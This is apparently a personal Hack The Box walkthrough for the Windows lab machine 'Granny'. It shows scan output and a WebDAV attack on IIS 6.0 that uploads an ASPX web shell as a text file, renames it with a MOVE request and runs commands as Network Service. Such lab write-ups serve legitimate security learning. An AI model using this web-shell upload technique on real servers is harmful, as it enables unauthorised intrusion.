# HTB - Granny
## OS - Windows 

I want to do this box without using Metasploit, so let's see how it goes!

I started with an nmap scan of Granny whose IP address is 10.10.10.15.

```
$nmap -sC -sV -oN granny.nmap 10.10.10.15
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-26 15:27 PST
Nmap scan report for 10.10.10.15
Host is up (0.097s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   Server Type: Microsoft-IIS/6.0
|   WebDAV type: Unknown
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Server Date: Sat, 26 Dec 2020 23:31:09 GMT
|_  Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.45 seconds

```

This is very similar to Grandpa box, so I ran davtest scan like Grandpa.

```
$davtest -url 10.10.10.15
********************************************************
 Testing DAV connection
OPEN		SUCCEED:		10.10.10.15
********************************************************
NOTE	Random string for this session: FTVFUmrC1gdYm
********************************************************
 Creating directory
MKCOL		FAIL
********************************************************
 Sending test files
PUT	pl	FAIL
PUT	jsp	FAIL
PUT	aspx	FAIL
PUT	cgi	FAIL
PUT	html	FAIL
PUT	txt	FAIL
PUT	jhtml	FAIL
PUT	php	FAIL
PUT	cfm	FAIL
PUT	shtml	FAIL
PUT	asp	FAIL

********************************************************
/usr/bin/davtest Summary:

```

I ran Nikto scan and Dirbuster too. Dirbuster showed images folder but it was empty.
```
$nikto -host http://10.10.10.15
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.15
+ Target Hostname:    10.10.10.15
+ Target Port:        80
+ Start Time:         2020-12-26 15:30:36 (GMT-8)
---------------------------------------------------------------------------
+ Server: Microsoft-IIS/6.0
+ Retrieved microsoftofficewebserver header: 5.0_Pub
+ Retrieved x-powered-by header: ASP.NET

```
The "x-powered-by header: ASP.NET" shows that aspx files may execute on the server. 

I tried to upload an aspx file, but it did not work. Text files worked, but not aspx.

```
curl -X PUT http://10.10.10.15/boxy.txt -d @boxy.txt

└──╼ $curl http://10.10.10.15/boxy.txt
Boxing day!

└──╼ $curl -X PUT http://10.10.10.15/boxy.aspx -d @boxy.txt
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<HTML><HEAD><TITLE>The page cannot be displayed</TITLE>
<META HTTP-EQUIV="Content-Type" Content="text/html; charset=Windows-1252">
<STYLE type="text/css">
  BODY { font: 8pt/12pt verdana }
  H1 { font: 13pt/15pt verdana }
  H2 { font: 8pt/12pt verdana }
  A:link { color: red }
  A:visited { color: maroon }
</STYLE>
</HEAD><BODY><TABLE width=500 border=0 cellspacing=10><TR><TD>

<h1>The page cannot be displayed</h1>
You have attempted to execute a CGI, ISAPI, or other executable program from a directory that does not allow programs to be executed.
<hr>
<p>Please try the following:</p>
<ul>
<li>Contact the Web site administrator if you believe this directory should allow execute access.</li>
</ul>
<h2>HTTP Error 403.1 - Forbidden: Execute access is denied.<br>Internet Information Services (IIS)</h2>
<hr>
<p>Technical Information (for support personnel)</p>
<ul>
<li>Go to <a href="http://go.microsoft.com/fwlink/?linkid=8180">Microsoft Product Support Services</a> and perform a title search for the words <b>HTTP</b> and <b>403</b>.</li>
<li>Open <b>IIS Help</b>, which is accessible in IIS Manager (inetmgr),
 and search for topics titled <b>Configuring ISAPI Extensions</b>, <b>Configuring CGI Applications</b>, <b>Securing Your Site with Web Site Permissions</b>, and <b>About Custom Error Messages</b>.</li>
<li>In the IIS Software Development Kit (SDK) or at the <a href="http://go.microsoft.com/fwlink/?LinkId=8181">MSDN Online Library</a>, search for topics titled <b>Developing ISAPI Extensions</b>, <b>ISAPI and CGI</b>, and <b>Debugging ISAPI Extensions and Filters</b>.</li>
</ul>

</TD></TR></TABLE></BODY></HTML>


```

Learned about a tool called cadaver that's a CLI for webdav on Unix. Also, there are webshells in Parrot in /usr/share/webshells. I am using the aspx one from that folder.

I'll try with cadaver and curl to copy the aspx shell. We can't PUT an aspx file directly due to restricted permissions. But the server allows MOVE webdav method, so we can PUT a text file and then MOVE it to aspx.

With cadaver:
```
$cadaver http://10.10.10.15
dav:/> help
Available commands: 
 ls         cd         pwd        put        get        mget       mput       
 edit       less       mkcol      cat        delete     rmcol      copy       
 move       lock       unlock     discover   steal      showlocks  version    
 checkin    checkout   uncheckout history    label      propnames  chexec     
 propget    propdel    propset    search     set        open       close      
 echo       quit       unset      lcd        lls        lpwd       logout     
 help       describe   about      
Aliases: rm=delete, mkdir=mkcol, mv=move, cp=copy, more=less, quit=exit=bye
dav:/> put cmdasp.txt
Uploading cmdasp.txt to `/cmdasp.txt':
Progress: [=============================>] 100.0% of 1400 bytes succeeded.
dav:/> move cmdasp.txt Destination:http://10.10.10.15/cmdasp.aspx
Moving `/cmdasp.txt' to `/Destination%3ahttp%3a//10.10.10.15/cmdasp.aspx':  failed:
404 Resource Not Found
dav:/> move cmdasp.txt http://10.10.10.15/cmdasp.aspx
Moving `/cmdasp.txt' to `/http%3a//10.10.10.15/cmdasp.aspx':  failed:
404 Resource Not Found
dav:/> move cmdasp.txt cmdasp.aspx
Moving `/cmdasp.txt' to `/cmdasp.aspx':  succeeded.
dav:/> 

```
We can do the same thing with curl too. Once that file is changed to aspx, visiting the web page shows a field to enter a command. 

![Granny ASP Shell](/images/Granny1.png)


When we run whoami there, we see we are "Network Service". Which means, our privileges are very limited. I'll try some other exploit.



